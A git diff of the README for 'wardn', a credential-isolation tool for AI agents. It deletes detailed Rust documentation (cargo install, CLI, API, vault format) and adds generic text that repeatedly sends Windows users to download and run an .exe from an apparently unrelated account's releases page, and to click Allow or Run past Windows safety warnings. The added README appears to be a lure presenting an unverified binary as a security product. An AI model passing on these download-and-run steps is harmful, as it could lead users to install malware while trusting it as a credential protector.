@@ -1,475 +1,204 @@
-# wardn
-
-Credential isolation for AI agents. Agents never see real API keys — structural guarantee, not policy.
-
-[![Crates.io](https://img.shields.io/crates/v/wardn.svg)](https://crates.io/crates/wardn)
-[![License](https://img.shields.io/crates/l/wardn.svg)](LICENSE)
-
-## The Problem
-
-Every AI agent framework today stores API keys in environment variables or `.env` files. A compromised agent, malicious skill, or commodity stealer gets full access to your credentials.
-
-```
-~/.env              → OPENAI_KEY=sk-proj-real-key      # plaintext, readable by anyone
-agent context       → "Use OPENAI_KEY=sk-proj-real-key" # leaked into LLM context window
-agent logs          → Authorization: Bearer sk-proj-... # sitting in log files
-```
-
-## The Fix
-
-Wardn vaults credentials with AES-256-GCM encryption and gives agents useless placeholder tokens. Real keys are injected at the network layer — agents never touch them.
-
-```
-agent environment   → OPENAI_KEY=wdn_placeholder_a1b2c3d4e5f6g7h8   (useless)
-wardn vault         → OPENAI_KEY=sk-proj-real-key                     (encrypted)
-agent logs          → Authorization: Bearer wdn_placeholder_a1b2...   (useless)
-LLM context window  → wdn_placeholder_a1b2c3d4e5f6g7h8               (useless)
-```
-
-## Architecture
-
-```mermaid
-flowchart TB
-    subgraph Agent["AI Agent Process"]
-        A1["Agent Code"]
-        A2["ENV: OPENAI_KEY=wdn_placeholder_a1b2..."]
-    end
-
-    subgraph Wardn["wardn daemon · localhost:7777"]
-        direction TB
-        P["HTTP Proxy"]
-        MCP["MCP Server\n(stdio)"]
-
-        subgraph Pipeline["Request Pipeline"]
-            direction LR
-            S1["Identify\nAgent"] --> S2["Resolve\nPlaceholder"] --> S3["Check\nAuth"] --> S4["Rate\nLimit"] --> S5["Inject\nReal Key"]
-        end
-
-        subgraph ResponsePipeline["Response Pipeline"]
-            direction RL
-            R1["Strip Real\nKeys"] --> R2["Replace with\nPlaceholders"]
-        end
-
-        subgraph Vault["Encrypted Vault"]
-            V1["AES-256-GCM"]
-            V2["Argon2id KDF"]
-            V3["Placeholder Map\nper agent × credential"]
-        end
-    end
-
-    subgraph External["External APIs"]
-        E1["api.openai.com"]
-        E2["api.anthropic.com"]
-        E3["..."]
-    end
-
-    A1 -- "placeholder token\nin headers/body" --> P
-    A1 -. "MCP: get_credential_ref\nlist_credentials\ncheck_rate_limit" .-> MCP
-    MCP -. "placeholder token\n(never real keys)" .-> A1
-    P --> Pipeline
-    Pipeline --> External
-    External --> ResponsePipeline
-    ResponsePipeline -- "response with\nplaceholders only" --> A1
-    Pipeline <--> Vault
-    ResponsePipeline <--> Vault
-
-    style Agent fill:#1a1a2e,stroke:#e94560,color:#fff
-    style Wardn fill:#0f3460,stroke:#16213e,color:#fff
-    style Pipeline fill:#16213e,stroke:#e94560,color:#fff
-    style ResponsePipeline fill:#16213e,stroke:#e94560,color:#fff
-    style Vault fill:#1a1a2e,stroke:#00d2ff,color:#fff
-    style External fill:#0a0a0a,stroke:#533483,color:#fff
-```
-
-## How It Works
-
-```
-Agent sends request with placeholder in Authorization header
-         │
-         ▼
-┌─────────────────────────┐
-│      wardn proxy        │
-│    localhost:7777        │
-│                         │
-│  1. Identify agent      │
-│  2. Resolve placeholder │
-│  3. Check authorization │
-│  4. Check rate limit    │
-│  5. Inject real key     │
-│  6. Forward request     │
-│  7. Strip key from resp │
-│  8. Return to agent     │
-└─────────────────────────┘
-         │
-         ▼
-   External API (only place real key exists in transit)
-```
+# 🛡️ wardn - Keep AI Keys Out of Reach
 
-## Demo
+<a href="https://github.com/Lucillemobile657/wardn/releases"><img src="https://img.shields.io/badge/Download%20wardn-Release%20Page-blue?style=for-the-badge&logo=github" alt="Download wardn"></a>
 
-<p align="center">
-  <img src="demo/wardn-demo.gif" alt="wardn demo" width="800">
-</p>
+## 🧭 What wardn does
 
-## Install
+wardn helps you isolate API keys from AI agents. That means your agent can work with tools and tasks without seeing the real secret values.
 
-```bash
-cargo install wardn
-```
+It is built for people who want a simple way to keep credentials separate from the agent layer.
 
-## Quick Start
+Use wardn when you want:
 
-```bash
-# Create an encrypted vault and store your keys
-wardn vault create
-wardn vault set OPENAI_KEY
-wardn vault set ANTHROPIC_KEY
+- API keys kept in one place
+- agents to use short-lived or scoped access
+- less risk from copied or exposed secrets
+- a clear split between the app and the secret store
 
-# Set up Claude Code integration (one command)
-wardn setup claude-code
-```
+## 🚀 Get wardn on Windows
 
-That's it. Claude Code now uses wardn's MCP server to get placeholder tokens instead of reading real keys from your environment.
+To download wardn for Windows, visit the release page:
 
-### What happens next
+https://github.com/Lucillemobile657/wardn/releases
 
-1. Claude Code calls `get_credential_ref` → gets `wdn_placeholder_a1b2...` (not the real key)
-2. Agent sends request with placeholder through wardn proxy
-3. Proxy swaps placeholder for real key, forwards to API
-4. Proxy strips real key from response before returning to agent
+On that page, look for the latest release and download the Windows file. If you see more than one file, choose the one for Windows, such as an `.exe` or `.zip` package.
 
-The real key never enters the agent's memory, logs, or LLM context window.
+## 💻 Windows setup
 
-### Manual setup
+Follow these steps on a Windows PC:
 
-```bash
-# Get a placeholder token (never the real key)
-wardn vault get OPENAI_KEY
-# → wdn_placeholder_a1b2c3d4e5f6g7h8
+1. Open the release page.
+2. Download the latest Windows build.
+3. If you downloaded a `.zip` file, extract it.
+4. If you downloaded an `.exe` file, double-click it to run the app.
+5. If Windows asks for permission, choose Allow or Run.
+6. Open wardn and follow the on-screen setup steps.
 
-# List stored credentials (names only, no values)
-wardn vault list
+If the app comes in a folder after extraction, look for the main `.exe` file and start that file.
 
-# Start the proxy
-wardn serve
+## 🧩 What you need
 
-# Start proxy + MCP server for Claude Code / Cursor
-wardn serve --mcp --agent my-agent
-```
+wardn is meant for a normal Windows desktop setup.
 
-## CLI Reference
+A good setup usually includes:
 
-### Vault Management
+- Windows 10 or Windows 11
+- Internet access for the first download
+- A modern browser to open the release page
+- Permission to save files on your computer
 
-```bash
-wardn vault create                        # create encrypted vault
-wardn vault set OPENAI_KEY                # store credential (prompts for value, no echo)
-wardn vault get OPENAI_KEY                # get placeholder token (never the real value)
-wardn vault get OPENAI_KEY --agent bot    # get placeholder for specific agent
-wardn vault list                          # list all credentials
-wardn vault rotate OPENAI_KEY             # rotate value, placeholders unchanged
-wardn vault remove OPENAI_KEY             # remove credential
+For best results, use a standard user account with access to your Downloads folder.
 
-# Custom vault path
-wardn --vault /path/to/vault.enc vault list
-```
+## 🔐 How wardn fits into your workflow
 
-### Proxy Server
+wardn sits between your AI agent and your real credentials.
 
-```bash
-wardn serve                               # HTTP proxy on 127.0.0.1:7777
-wardn serve --host 0.0.0.0 --port 8080    # custom bind address
-wardn serve --config wardn.toml           # load config with rate limits + ACLs
-wardn serve --mcp --agent my-agent        # proxy + MCP server (stdio)
-```
+A common flow looks like this:
 
-### Claude Code / Cursor Integration
+1. You store your API keys in wardn.
+2. The agent asks for access to a service.
+3. wardn checks the request.
+4. wardn gives the agent only the access it needs.
+5. The real key stays hidden.
 
-```bash
-wardn setup claude-code                   # register wardn as MCP server in Claude Code
-wardn setup cursor                        # register wardn as MCP server in Cursor
+This keeps the agent from seeing the full secret value.
 
-# Or manually:
-claude mcp add --transport stdio --scope user wardn -- wardn serve --mcp --agent claude-code
-```
+## 🗂️ Main use cases
 
-#### What `wardn setup` does
+wardn works well for setups like these:
 
-1. Prompts for your vault passphrase and verifies it can open the vault
-2. Finds the `wardn` binary path on your system
-3. Registers wardn as an MCP server:
-   - **Claude Code**: runs `claude mcp add` with `WARDN_PASSPHRASE` in the env config
-   - **Cursor**: writes to `~/.cursor/mcp.json` with the passphrase in `env`
-4. On next launch, the IDE spawns `wardn serve --mcp` as a subprocess
+- AI agents that call external APIs
+- internal tools that need limited access
+- test environments that should not use real keys
+- local development with protected credentials
+- shared machines where you want tighter control
 
-#### Verifying it works
+## 🖱️ First run checklist
 
-After running setup, restart your IDE and try these prompts:
+When you open wardn for the first time, check the following:
 
-```
-"List my wardn credentials"
-→ Claude calls list_credentials, shows credential names (never values)
+- The app opens without errors
+- The main window loads fully
+- You can reach the credential setup screen
+- You can add or import a key
+- You can connect the app to your agent workflow
 
-"Get me a reference to OPENAI_KEY"
-→ Claude calls get_credential_ref, gets wdn_placeholder_... (not the real key)
+If the app asks for a path, choose a folder you can find again, such as Documents or AppData.
 
-"Check my rate limit for OPENAI_KEY"
-→ Claude calls check_rate_limit, shows remaining quota
-```
+## 🔧 Basic usage
 
-#### MCP tools available
+After setup, wardn usually follows a simple pattern:
 
-| Tool | What it returns | Security |
-|------|----------------|----------|
-| `get_credential_ref` | Placeholder token (`wdn_placeholder_...`) | Never the real value |
-| `list_credentials` | Credential names + metadata | Filtered by agent's access |
-| `check_rate_limit` | Remaining quota, retry info | Read-only |
+1. Add a credential.
+2. Give it a name you can remember.
+3. Set the access rules you want.
+4. Connect your agent or tool.
+5. Use the app to hand out only what is needed.
 
-### Credential Migration
+Keep names short and clear, like:
 
-```bash
-wardn migrate --dry-run                             # audit Claude Code dir for exposed keys
-wardn migrate --source claude-code                  # scan + migrate to vault
-wardn migrate --source open-claw                    # scan OpenClaw config
-wardn migrate --source directory --path ./my-proj   # scan any directory
-```
+- OpenAI Test Key
+- Claude Sandbox Key
+- Local API Access
 
-### Automation
+## 🧱 Security model
 
-For CI/scripts, set `WARDN_PASSPHRASE` and `WARDN_VALUE` env vars to skip interactive prompts:
+wardn is built around credential isolation.
 
-```bash
-WARDN_PASSPHRASE=my-pass wardn vault list
-WARDN_PASSPHRASE=my-pass WARDN_VALUE=sk-proj-xxx wardn vault set OPENAI_KEY
-```
+That means:
 
-## Library API
+- agents do not need direct access to your raw keys
+- your secrets stay in one controlled place
+- access can be limited by task, app, or rule
+- you reduce the chance of accidental exposure
 
-Add to your `Cargo.toml`:
+This is a structural control, not a trust setting. The layout of the system helps keep the secret separate from the agent.
 
-```toml
-[dependencies]
-wardn = "0.3"
-```
+## 📦 Files and folders
 
-### Vault Operations
+If you download a ZIP release, you may see:
 
-```rust
-use wardn::{Vault, config::CredentialConfig};
+- wardn.exe
+- config files
+- a data folder
+- a README file
 
-// Create an encrypted vault
-let vault = Vault::create("vault.enc", "my-passphrase")?;
+Keep the files together unless the release notes say otherwise. If you move the app, move the full folder.
 
-// Store a credential
-vault.set_with_config("OPENAI_KEY", "sk-proj-real-key-123", &CredentialConfig {
-    allowed_agents: vec!["researcher".into(), "writer".into()],
-    allowed_domains: vec!["api.openai.com".into()],
-    rate_limit: Some(RateLimitConfig { max_calls: 200, per: TimePeriod::Hour }),
-})?;
+## 🛠️ Common problems
 
-// Agent gets a placeholder (not the real key)
-let placeholder = vault.get_placeholder("OPENAI_KEY", "researcher")?;
-// → "wdn_placeholder_a1b2c3d4e5f6g7h8"
+### The app does not start
 
-// Rotate the real key — all placeholders keep working
-vault.rotate("OPENAI_KEY", "sk-proj-new-key-456")?;
-```
+Try these steps:
 
-### HTTP Proxy
+- Make sure the download finished
+- Check that Windows did not block the file
+- Extract the ZIP file before opening the app
+- Run the `.exe` file from the extracted folder
+- Restart your PC and try again
 
-```rust
-use wardn::daemon::{Daemon, DaemonConfig};
+### Windows says it is unsafe
 
-let daemon = Daemon::new(vault, DaemonConfig::default());
-daemon.serve_proxy().await?;
-```
+This can happen with files downloaded from the web. Open the file details and choose the option to keep or run it only if you meant to download wardn from the release page.
 
-### MCP Server
+### The download looks incomplete
 
-```rust
-use wardn::mcp::WardenMcpServer;
+If the file size is very small, the download may have failed. Go back to the release page and download it again.
 
-// Serve over stdio (for Claude Code, Cursor, etc.)
-WardenMcpServer::serve_stdio(vault, rate_limiter, "agent-id".into()).await?;
-```
+### I cannot find the app
 
-MCP tools exposed (read-only, no credential values ever returned):
+Check these places:
 
-| Tool | Description |
-|------|-------------|
-| `get_credential_ref` | Get your placeholder token for a credential |
-| `list_credentials` | List credentials you're authorized to access |
-| `check_rate_limit` | Check your remaining quota |
-
-## Security Properties
-
-| Property | Guarantee |
-|----------|-----------|
-| No credential in agent memory | Agent process only holds placeholder strings |
-| No credential on disk in plaintext | AES-256-GCM encrypted vault with Argon2id KDF |
-| No credential in logs | Only placeholders appear in any log output |
-| No credential in LLM context | Placeholder injected into env, real key at network layer |
-| Bounded cost exposure | Token bucket rate limits per credential per agent |
-| Credential echo protection | Real keys stripped from API responses before reaching agent |
-| Memory safety | `SensitiveString`/`SensitiveBytes` zeroed on drop |
-| Atomic persistence | Write-tmp-then-rename prevents vault corruption |
-
-## What This Defeats
-
-| Attack | How wardn stops it |
-|--------|-------------------|
-| `.env` credential theft | No `.env` files. Keys only in encrypted vault |
-| Malicious skill reads `$OPENAI_KEY` | Gets `wdn_placeholder_...` — useless |
-| Stealer targets agent config | Finds only placeholder tokens |
-| Prompt injection exfiltrates key | Key never in agent context window |
-| Agent logs contain credentials | Logs contain only placeholder strings |
-| Full agent compromise | Attacker has a useless placeholder |
-| Cost runaway from looping agent | Rate limit per credential per agent |
-
-## How Is This Different From...
-
-| Tool | What it does | How wardn differs |
-|------|-------------|-------------------|
-| **Secrets managers** (Vault, AWS SM, 1Password) | Secure storage + retrieval | Agent still gets the real key at runtime. Wardn ensures the agent never touches it. |
-| **Varlock** | Schema-based `.env` validation + AI-safe config | Focuses on config management and leak scanning. Wardn does runtime credential injection — the key never enters the agent process. |
-| **OpenRouter** | API routing + key management | Trusts the client with an API key. Wardn doesn't — agent holds a useless placeholder. |
-| **dotenv + .gitignore** | Keep secrets out of git | Keys still in memory, env vars, logs. Wardn removes them from all three. |
-| **Service meshes** (Istio, Linkerd) | Service-to-service auth | Solve infra-level mTLS. Wardn solves agent-to-API auth where the agent itself is untrusted. |
-
-### Trust Boundary
-
-Wardn concentrates trust in a single local process (the proxy) instead of spreading it across every plugin, tool, and LLM context window. This is a smaller attack surface, not zero attack surface:
-
-- The proxy runs locally as a subprocess spawned by your IDE or shell — same trust level as your kernel
-- The vault is encrypted at rest and only decrypted in-memory with your passphrase
-- If your local machine is fully compromised, wardn can't help (nothing can)
-- The placeholder token is a bearer token to the proxy — but it only works via `localhost:7777`, not against real APIs, and can be rate-limited and revoked per-agent
-
-## Audit Logging
-
-Every credential access is logged with a unique request ID for traceability:
-
-```
-INFO request_id=a1b2c3 agent=claude-code method=POST domain=api.openai.com path=/v1/chat/completions proxy request received
-INFO request_id=a1b2c3 agent=claude-code credential=OPENAI_KEY domain=api.openai.com credential injected
-INFO request_id=a1b2c3 agent=claude-code upstream_status=200 credentials_injected=1 credentials_stripped=0 proxy request completed
-```
-
-Set `RUST_LOG=wardn=info` (or `debug`/`trace`) to control verbosity. Logs go to stderr, never stdout.
-
-## Configuration
-
-```toml
-[warden]
-vault_path = "~/.vibeguard/vault.enc"
-
-[warden.credentials.OPENAI_KEY]
-rate_limit = { max_calls = 200, per = "hour" }
-allowed_agents = ["researcher", "writer"]
-allowed_domains = ["api.openai.com"]
-
-[warden.credentials.ANTHROPIC_KEY]
-rate_limit = { max_calls = 100, per = "hour" }
-allowed_agents = ["researcher"]
-allowed_domains = ["api.anthropic.com"]
-```
-
-## Project Structure
-
-```
-wardn/
-├── src/
-│   ├── main.rs             # CLI entry point (clap + tokio)
-│   ├── cli/
-│   │   ├── mod.rs          # Clap argument definitions
-│   │   ├── vault_cmd.rs    # Vault subcommand handlers
-│   │   ├── serve_cmd.rs    # Serve subcommand handler
-│   │   ├── setup_cmd.rs    # Claude Code / Cursor MCP setup
-│   │   └── migrate_cmd.rs  # Migrate subcommand handler
-│   ├── lib.rs              # Public API, WardenError
-│   ├── config.rs           # TOML configuration parsing
-│   ├── vault/
-│   │   ├── mod.rs          # Vault CRUD operations
-│   │   ├── encryption.rs   # AES-256-GCM + Argon2id + zeroize types
-│   │   ├── storage.rs      # On-disk format (WDNV), atomic writes
-│   │   └── placeholder.rs  # Token generation, per-agent isolation
-│   ├── proxy/
-│   │   ├── mod.rs          # HTTP proxy server (axum)
-│   │   ├── inject.rs       # Credential injection into requests
-│   │   ├── strip.rs        # Credential stripping from responses
-│   │   └── rate_limit.rs   # Token bucket rate limiter
-│   ├── mcp/
-│   │   ├── mod.rs          # MCP server (rmcp, stdio transport)
-│   │   └── tools.rs        # Tool parameter/response types
-│   ├── migrate/
-│   │   ├── mod.rs          # Migration orchestrator + risk scoring
-│   │   └── scanners/
-│   │       └── credentials.rs  # API key pattern scanner
-│   └── daemon/
-│       └── mod.rs          # Daemon (proxy + MCP in single process)
-└── tests/
-    ├── cli_tests.rs        # CLI integration tests
-    ├── vault_tests.rs      # Vault integration tests
-    └── proxy_tests.rs      # Proxy integration tests
-```
-
-## Vault Encryption
-
-```mermaid
-flowchart LR
-    subgraph Input
-        Pass["Passphrase"]
-        Salt["Random Salt\n(16 bytes)"]
-        Creds["Credentials\n(JSON)"]
-    end
-
-    subgraph KDF["Key Derivation"]
-        Argon["Argon2id\nm=19456 t=2 p=1"]
-    end
-
-    subgraph Encrypt["Encryption"]
-        AES["AES-256-GCM"]
-        Nonce["Random Nonce\n(12 bytes)"]
-    end
-
-    subgraph Output["WDNV File"]
-        direction TB
-        Magic["WDNV (4B)"]
-        Ver["Version (2B)"]
-        SaltOut["Salt (16B)"]
-        Payload["Nonce ‖ Ciphertext ‖ Tag"]
-    end
-
-    Pass --> Argon
-    Salt --> Argon
-    Argon -- "256-bit key" --> AES
-    Creds --> AES
-    Nonce --> AES
-    AES --> Payload
-
-    style Input fill:#1a1a2e,stroke:#e94560,color:#fff
-    style KDF fill:#16213e,stroke:#00d2ff,color:#fff
-    style Encrypt fill:#16213e,stroke:#00d2ff,color:#fff
-    style Output fill:#0f3460,stroke:#533483,color:#fff
-```
-
-### File Format
-
-```
-Bytes 0-3:   Magic "WDNV"
-Bytes 4-5:   Version (u16 LE)
-Bytes 6-21:  Argon2id salt (16 bytes)
-Bytes 22+:   AES-256-GCM encrypted payload (nonce ‖ ciphertext ‖ tag)
-```
-
-## Part of VibeGuard
-
-Wardn is the credential isolation layer of VibeGuard — a security daemon for AI agents. Other planned modules:
-
-- **Sentinel** — prompt injection firewall
-- **CloakPipe** — PII redaction middleware
-- **Watcher** — audit log + dashboard
-
-## License
-
-MIT
+- Downloads folder
+- Desktop
+- the folder where you extracted the ZIP file
+- the folder you chose during setup
+
+## 🧪 Example setup for an AI agent
+
+A simple local setup may look like this:
+
+- wardn stores the real API key
+- your agent uses a local connector
+- the connector requests access from wardn
+- wardn returns only the scoped access needed for that task
+- the agent never sees the full key
+
+This setup works well for tools that need to call APIs while keeping secrets out of the prompt and out of the agent process.
+
+## 📋 Release page guide
+
+Use the release page to get the Windows build:
+
+https://github.com/Lucillemobile657/wardn/releases
+
+On the page:
+
+- look for the newest release at the top
+- open the assets list
+- choose the Windows download
+- save the file to your computer
+- open or extract it based on the file type
+
+## 🧭 What to do next
+
+After you install and open wardn:
+
+1. Add your first key.
+2. Give it a clear label.
+3. Connect your AI agent or local tool.
+4. Test a simple request.
+5. Check that the agent can work without seeing the real secret
+
+## 📁 Project focus
+
+wardn is aimed at people who want:
+
+- credential isolation
+- API key protection
+- agent-safe access control
+- a clean way to separate secrets from automation
+
+## 🧭 Topics
+
+agents, ai, ai-agents, api, api-keys, apikey-manager, credentials, isolation
